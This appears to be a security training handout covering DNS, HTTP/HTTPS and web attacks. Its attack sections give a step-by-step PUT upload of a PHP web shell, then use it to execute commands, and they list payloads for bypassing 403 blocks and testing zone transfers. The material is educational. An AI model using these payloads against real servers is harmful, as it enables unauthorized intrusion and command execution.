# Web Fundamentals: DNS, HTTP/S, and Web Security Architecture

---

## 1. Domain Name System (DNS) Deep Dive

The **Domain Name System (DNS)** serves as the distributed phonebook of the internet. It maps human-friendly strings (domain names like `infosec4tc.com`) to machine-routable numerical Layer 3 identifiers (IPv4/IPv6 addresses).

### 1.1 The Domain Hierarchy

DNS is organized as an inverted hierarchical tree:

```
                      [ Root Domain (.) ]
                               |
               +---------------+---------------+
               |                               |
       [ Top-Level Domain (TLD) ]    [ ccTLD (.uk, .ae, .eg) ]
       (.com, .org, .net, .edu)
               |
    [ Second-Level Domain (SLD) ]
          (infosec4tc)
               |
         [ Subdomains ]
     (lms, mail, store, dev)

```

1. **Root Domain (`.`):** The apex of the hierarchy, maintained globally by 13 logical sets of root name server clusters (labeled `a.root-servers.net` through `m.root-servers.net`).
2. **Top-Level Domains (TLD):**
* **gTLD (Generic):** `.com` (Commercial), `.org` (Organization), `.edu` (Education), `.net` (Network infrastructure), `.gov` (Government).
* **ccTLD (Country Code):** Country-specific identifiers such as `.uk` (United Kingdom), `.ae` (United Arab Emirates), `.eg` (Egypt), `.us` (United States).


3. **Second-Level Domain (SLD):** The distinct brand or entity name directly preceding the TLD (e.g., `infosec4tc` in `infosec4tc.com`).
4. **Subdomains:** Prefixes mapped under the SLD to segment discrete infrastructure, applications, or functions (e.g., `lms.infosec4tc.com`).

### 1.2 Structural Rules & RFC Constraints

* **Label Limit:** Each individual label/subdomain segment can be a maximum of **63 characters**.
* **Character Set:** Permitted characters are alphanumeric (`a-z`, `0-9`) and internal hyphens (`-`).
* **Hyphen Restrictions:** A label **cannot** start or end with a hyphen, nor contain consecutive hyphens in specific header-reserved positions.
* **FQDN Total Limit:** The total length of a Fully Qualified Domain Name (FQDN) cannot exceed **253 characters**.
* **Subdomain Scaling:** There is no hard RFC limit on the *number* of subdomains an owner can bind beneath a registered SLD.

---

### 1.3 Core DNS Record Types

| Record Type | Full Designation | Architectural Purpose & Offensive / Security Relevance |
| --- | --- | --- |
| **`A`** | Address Record | Resolves an FQDN directly to a 32-bit **IPv4** address. |
| **`AAAA`** | Quad-A Record | Resolves an FQDN to a 128-bit **IPv6** address. |
| **`CNAME`** | Canonical Name | Maps an alias name to another canonical domain. **Offensive note:** Frequently points to external SaaS providers (e.g., AWS S3, Shopify, GitHub Pages, Zendesk). If the underlying external asset is deleted while the CNAME record remains, it enables **Subdomain Takeover**. |
| **`MX`** | Mail Exchange | Designates the mail server(s) responsible for receiving incoming email on behalf of the domain, complete with a **priority integer** (lower number = higher preference). |
| **`TXT`** | Text Record | Carries human or machine-readable text. Primarily utilized to deploy email verification and anti-spoofing policies: **SPF** (Sender Policy Framework), **DKIM** (DomainKeys Identified Mail), and **DMARC**. |
| **`NS`** | Name Server | Delegates a DNS zone to use specific authoritative name servers. |
| **`PTR`** | Pointer Record | Resolves an IP address back to an FQDN (Reverse DNS Lookup). |

---

### 1.4 Step-by-Step Recursive Resolution Lifecycle

When a client queries a domain name (`infosec4tc.com`), the operating system and downstream servers initiate a multi-phase lookup flow:

```
[Client / Browser]
       |
       | 1. Query: "What is the IP of infosec4tc.com?"
       v
[Local Cache & Hosts File] --(If Miss)--> [Recursive Resolver (ISP / 8.8.8.8)]
                                                  |
       +------------------------------------------+
       | 2. Iterate: "Where is .com?"
       v
[Root Name Server (.)]
       |
       | 3. Reply: "Refer to .com TLD Name Servers: <TLD IP>"
       v
[Recursive Resolver]
       |
       | 4. Iterate: "Where is infosec4tc.com?"
       v
[.com TLD Server]
       |
       | 5. Reply: "Authoritative server is ns1.infosec4tc.com: <Auth IP>"
       v
[Recursive Resolver]
       |
       | 6. Direct Query: "What is infosec4tc.com?"
       v
[Authoritative Name Server]
       |
       | 7. Authoritative Answer: "infosec4tc.com A 104.21.xx.xx (TTL = 300)"
       v
[Recursive Resolver] --(Caches Record locally for TTL duration)--> [Client Browser]

```

#### Time-to-Live (TTL) & Caching Mechanics

* **TTL (Time to Live):** A 32-bit unsigned integer value specified in seconds within the DNS resource record.
* **Caching Rule:** Dictates exactly how long intermediate resolvers and local endpoints can cache the resolved record before purging it and initiating a fresh recursive lookup.
* **Security Consideration:** Short TTLs permit rapid failover and dynamic load balancing; long TTLs reduce server overhead but delay propagation of legitimate network updates or emergency security reroutes.

---

### 1.5 DNS Security: Protective Resolvers vs. Malicious Redirection

* **Public Trusted DNS Infrastructure:**
* **Google:** `8.8.8.8` / `8.8.4.4` (Low latency, high throughput).
* **Cloudflare:** `1.1.1.1` / `1.0.0.1` (Privacy-centric, no logging policy).
* **Comodo Secure DNS:** `8.26.56.26` / `8.20.247.20` (Protective DNS: intercepts and null-routes requests attempting to reach domains tagged as malicious, Command & Control (C2), phishing, or malware distributors).


* **Threat Model (DNS Hijacking / Poisoning):**
* Attackers who compromise host network adapters, DHCP configurations, or home/office routers frequently overwrite primary DNS addresses with adversary-controlled resolvers.
* **Consequence:** Requests to legitimate financial institutions or cloud portals are returned with attacker-controlled IP addresses hosting exact clone web pages to execute credential harvesting.



---

## 2. HTTP/HTTPS Protocol Mechanics

The **Hypertext Transfer Protocol (HTTP)** is an application-layer request-response protocol running over TCP (traditionally port 80).

### 2.1 HTTP vs. HTTPS

```
[ HTTP (Port 80) ]  ================ Plaintext ================> [ Wire / ISP / MitM Sniffable ]
[ HTTPS (Port 443) ] === TLS (Handshake + Symmetric Encryption) ==> [ Opaque Ciphertext ]

```

* **Cleartext Transmission (HTTP):** Transmits request verbs, headers, session cookies, and authentication payloads across the wire unencrypted. Anyone with access to the transit route (compromised switch, rogue Wi-Fi access point, ISP telemetry, malicious upstream router) can intercept the data via packet analyzers like Wireshark.
* **TLS Encapsulation (HTTPS):** Wraps standard HTTP packets inside a **Transport Layer Security (TLS)** cryptographic tunnel. Guarantees three fundamental security objectives:
1. **Confidentiality:** Data cannot be read in cleartext by unauthorized third parties.
2. **Integrity:** Prevents data tampering or in-transit packet injection.
3. **Authenticity:** Validates through cryptographic X.509 certificates that the server is genuine.



---

### 2.2 URL Deconstruction

A Uniform Resource Locator (URL) combines protocol, addressing, network port, path, and runtime parameters:

$$\text{\texttt{[https://admin:SecretPass123@example.com:8080/v1/users/view?id=105](https://admin:SecretPass123@example.com:8080/v1/users/view?id=105)\&format=json\#profile}}$$

```
+-----------+----------------------+--------------------+-------+--------------------+-------------------------+----------+
|  Scheme   | User Authentication  |        Host        | Port  |       Path         |      Query String       | Fragment |
+-----------+----------------------+--------------------+-------+--------------------+-------------------------+----------+
| https://  | admin:SecretPass123@ |    example.com     | :8080 |  /v1/users/view    | ?id=105&format=json     | #profile |
+-----------+----------------------+--------------------+-------+--------------------+-------------------------+----------+

```

* **Scheme / Protocol:** Declares the transport implementation (`http`, `https`).
* **Authority / Credentials:** Optional user:password authentication parameter prepended to the host (insecure, largely deprecated).
* **Host:** The destination FQDN or IP address.
* **Port:** Target transmission control socket (Defaults: 80 for HTTP, 443 for HTTPS).
* **Path:** Hierarchical location specifying the targeted virtual directory, file, or API endpoint.
* **Query String (`?` key=value):** Delimited by `&`, passes dynamic variable parameters to server-side backend logic.
* **Fragment (`#`):** Client-side directional anchor parsed exclusively by the local browser; **never forwarded by modern browsers inside upstream HTTP request headers**.

---

### 2.3 Anatomy of HTTP Requests & Responses

#### Raw HTTP Request

```http
GET /api/v1/dashboard HTTP/1.1
Host: target-app.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://target-app.com/login
Cookie: session_token=a8f9c1e7d0b345ef8a; role=analyst
Connection: close

```

#### Raw HTTP Response

```http
HTTP/1.1 200 OK
Date: Fri, 02 Oct 2026 12:09:25 GMT
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1042
Set-Cookie: session_token=a8f9c1e7d0b345ef8a; Secure; HttpOnly; SameSite=Strict
Connection: close

<!DOCTYPE html>
<html>
<head><title>Admin Console</title></head>
...

```

---

### 2.4 HTTP Verbs / Methods

```
                                  [ HTTP Verbs ]
         ________________________________|________________________________
        |                |               |               |                |
     [ GET ]          [ POST ]        [ PUT ]        [ DELETE ]      [ OPTIONS ]
(Read Resources)  (Create Data)   (Write/Replace)  (Remove Asset)  (Query Server)

```

1. **`GET`:** Requests data from a specified resource. Parameters are appended directly to the URL string. Must be idempotent and safe under RFC definitions (does not modify server state).
2. **`POST`:** Transmits payloads inside the **HTTP message body** rather than the URL. Used to submit forms, issue credentials, and create stateful entity records.
3. **`PUT`:** Replaces all current representations of the target resource with the uploaded request payload. If the file does not exist, the server may create it.
4. **`DELETE`:** Removes the targeted resource identified by the URI path.
5. **`OPTIONS`:** Describes the communication options and accepted HTTP verbs permitted by the target web server via the `Allow` or `Access-Control-Allow-Methods` response headers.
6. **`PATCH`:** Applies partial modifications to a resource.

---

## 3. Web Application Security & Exploitation Vectors

### 3.1 Exploiting Arbitrary HTTP Verbs: Arbitrary File Upload via `PUT`

Web servers with insecure configurations may expose dangerous verbs (`PUT`, `DELETE`) to unauthenticated clients. This can lead to Remote Code Execution (RCE) via direct backdoor uploads.

```
Attacker (Burp Suite)                                Web Server (Apache/Nginx)
        |                                                        |
        | 1. Send: OPTIONS / HTTP/1.1                            |
        | -----------------------------------------------------> |
        |                                                        |
        | 2. Receive: HTTP/1.1 200 OK                            |
        |    Allow: GET, POST, OPTIONS, PUT, DELETE              |
        | <----------------------------------------------------- |
        |                                                        |
        | 3. Send: PUT /uploads/shell.php HTTP/1.1               |
        |    Payload: <?php system($_GET['cmd']); ?>             |
        | -----------------------------------------------------> |
        |                                                        |
        | 4. Receive: HTTP/1.1 201 Created                       |
        | <----------------------------------------------------- |
        |                                                        |
        | 5. Trigger Execution: GET /uploads/shell.php?cmd=id    |
        | -----------------------------------------------------> |
        |                                                        |
        | 6. Receive: uid=33(www-data) gid=33(www-data)          |
        | <----------------------------------------------------- |

```

#### Step-by-Step Exploitation Walkthrough

1. **Fingerprinting Allowed Methods via `OPTIONS`:**
Send an `OPTIONS` query via Burp Suite Repeater:
```http
OPTIONS / HTTP/1.1
Host: vulnerable-target.com

```


Examine the response header:
```http
HTTP/1.1 200 OK
Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS

```


2. **Uploading an Executable Web Shell via `PUT`:**
Craft a custom `PUT` request referencing a target path and insert arbitrary server-side code (e.g., PHP):
```http
PUT /shell.php HTTP/1.1
Host: vulnerable-target.com
Content-Type: application/x-php
Content-Length: 35

<?php system($_GET['cmd']); ?>

```


3. **Verifying File Creation:**
If vulnerable, the server returns an HTTP status code indicating success:
```http
HTTP/1.1 201 Created
Location: /shell.php

```


4. **Executing Commands via Remote Code Execution (RCE):**
Request the newly created resource through a browser or curl, passing system commands through the query parameter:
```bash
curl -s "http://vulnerable-target.com/shell.php?cmd=whoami"
# Output: www-data

```



---

### 3.2 HTTP Status Codes & 401/403 Access Control Bypasses

#### Status Code Classification

| Class | Type | Common Examples |
| --- | --- | --- |
| **`100–199`** | Informational | `101 Switching Protocols` (e.g., upgrade to WebSockets) |
| **`200–299`** | Success | `200 OK`, `201 Created` (asset written), `204 No Content` |
| **`300–399`** | Redirection | `301 Moved Permanently`, `302 Found` (temporary redirect) |
| **`400–499`** | Client Error | `400 Bad Request`, `401 Unauthorized` (auth required), `403 Forbidden` (access denied), `404 Not Found`, `405 Method Not Allowed` |
| **`500–599`** | Server Error | `500 Internal Server Error`, `502 Bad Gateway`, `503 Service Unavailable` |

---

### 3.3 Advanced 403 Forbidden Bypass Techniques

When a Web Application Firewall (WAF) or reverse proxy blocks access to an administrative interface (e.g., `/admin` returns `403 Forbidden`), structural path manipulation and custom HTTP headers can often bypass access controls.

```
Client Probe ---------------------> [ Reverse Proxy / WAF ] ---------------------> [ Backend Server ]
(/ADMIN, /admin/., etc.)           Blocks on exact match:        Normalizes path:
                                   "/admin" == DENY              Evaluates to "/admin"
                                                                 Executes request!

```

#### Technique 1: URI Path Manipulation & Normalization Bugs

Web proxies and backend application servers may parse URLs differently:

* Case alteration: `/ADMIN`, `/Admin`, `/aDmiN`
* Path segment injection: `/admin/.`, `/admin/..;/admin`, `/admin/./`
* Duplicate slashes: `//admin//index.php`
* Dot/Semicolon URL truncation: `/admin;`, `/admin;foo=bar`
* URL encoding variations: `/%61%64%6d%69%6e`, `/%2561dmin` (Double encoding)

#### Technique 2: Header-Based Identity Spoofing

Reverse proxies often forward the original client identity via internal headers. If the application server trusts these headers implicitly, an attacker can spoof a loopback connection:

```http
GET /admin HTTP/1.1
Host: example.com
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1

```

#### Technique 3: HTTP Verb Tampering & Payload Stripping

* Change `GET` to `POST` while passing `Content-Length: 0`.
* Alter the request to `TRACE`, `HEAD`, or custom verbs to test if the authorization filter is strictly mapped only to `GET`.

---

## 4. Modern Threat Landscape & Bug Bounty Methodology

### 4.1 Penetration Testing vs. Bug Bounty Hunting

```
+-----------------------------------------------------------------------------------+
|                        OFFENSIVE SECURITY PARADIGMS                               |
+-----------------------------------------------------------------------------------+
|  DIMENSION       | PENETRATION TESTING           | BUG BOUNTY HUNTING             |
+------------------+-------------------------------+--------------------------------+
|  Scope Model     | Broad coverage, fixed range   | Specific scope policy, deep    |
|                  | checklist (OWASP Top 10)      | creative edge-case exploitation|
+------------------+-------------------------------+--------------------------------+
|  Compensation    | Fixed hourly/contract fee     | Performance-only bounties based|
|                  |                               | on Severity (Low to Critical)  |
+------------------+-------------------------------+--------------------------------+
|  Crowd Dynamics  | Small, assigned security team | Thousands of concurrent global |
|                  |                               | researchers competing on speed |
+------------------+-------------------------------+--------------------------------+
|  Operational Goal| Identify as many baseline     | Uncover unique, unpatched,     |
|                  | flaws as possible in timeframe| high-impact exploit chains     |
+------------------+-------------------------------+--------------------------------+

```

### 4.2 Research Habit: The Daily Continuous Improvement Loop

1. **Public Disclosure Ingestion:** Review recently disclosed reports on platforms like **HackerOne** and **Bugcrowd**. Trace the vulnerability chain, identifying root-cause application logic flaws.
2. **Payload Adaptation:** Note functional bypass techniques, novel encoding variants, and unique payload structures.
3. **Hypothesis Formulation & Testing:** Identify similar software stacks (e.g., GraphQL architectures, OAuth implementations) across targets in your authorized scope and test for the same underlying vulnerability classes.
4. **Automation:** Write custom Bash/Python automation tools and search queries to detect exposed assets (e.g., misconfigured Amazon AWS S3 storage buckets, sensitive `.git` directories) before other researchers discover them.

---

## 5. Practical Command Reference

### DNS Investigation (`nslookup` & `dig`)

```bash
# Query A Record (IPv4 Resolution)
nslookup example.com

# Query Specific Record Type (MX) via a Specific Resolver (Cloudflare)
nslookup -type=mx example.com 1.1.1.1

# Query TXT Records (SPF / DKIM validation)
dig example.com TXT +short

# Enumerate Nameservers and trace full root-downward resolution chain
dig example.com +trace

# Test for Unrestricted Zone Transfer (AXFR) vulnerability
dig axfr @ns1.example.com targetdomain.com

```

### Protocol & Web Assessment Tools

```bash
# Banner grab and view full HTTP response headers
curl -I -s https://example.com

# Send custom HTTP verb with an arbitrary header
curl -X OPTIONS -v https://example.com

# Send an authenticated PUT request carrying file data
curl -X PUT -d "<?php phpinfo(); ?>" https://example.com/test.php

# Perform 403 bypass test using custom loopback headers
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" https://example.com/admin/

# Automated web server scanner (Nikto) - Useful for traditional pen testing
nikto -h http://example.com -Tuning 1,2,3,b

```

---

## 6. Student Review Questions & Practice Scenarios

1. **DNS Architecture:** A developer creates a record pointing `shop.company.com` to `thirdpartystore.myshopify.com`. What DNS record type is being used? If the company closes its Shopify account but leaves the DNS record active, what vulnerability does this introduce?
2. **Protocol Analysis:** When inspecting cleartext traffic in a local Wireshark capture, what specific indicators confirm that an HTTP session is active rather than an HTTPS session? What sensitive information might be exposed?
3. **HTTP Verb Exploitation:** While reviewing responses to an `OPTIONS` request, you observe: `Allow: GET, POST, OPTIONS, PUT, DELETE`. What manual testing steps should you run through Burp Suite Repeater to verify if arbitrary file upload is possible?
4. **Access Control Bypass:** You attempt to access `[https://target.com/console](https://target.com/console)` and receive an `HTTP 403 Forbidden` response. Outline at least three distinct methods you could use to try to bypass this restriction.
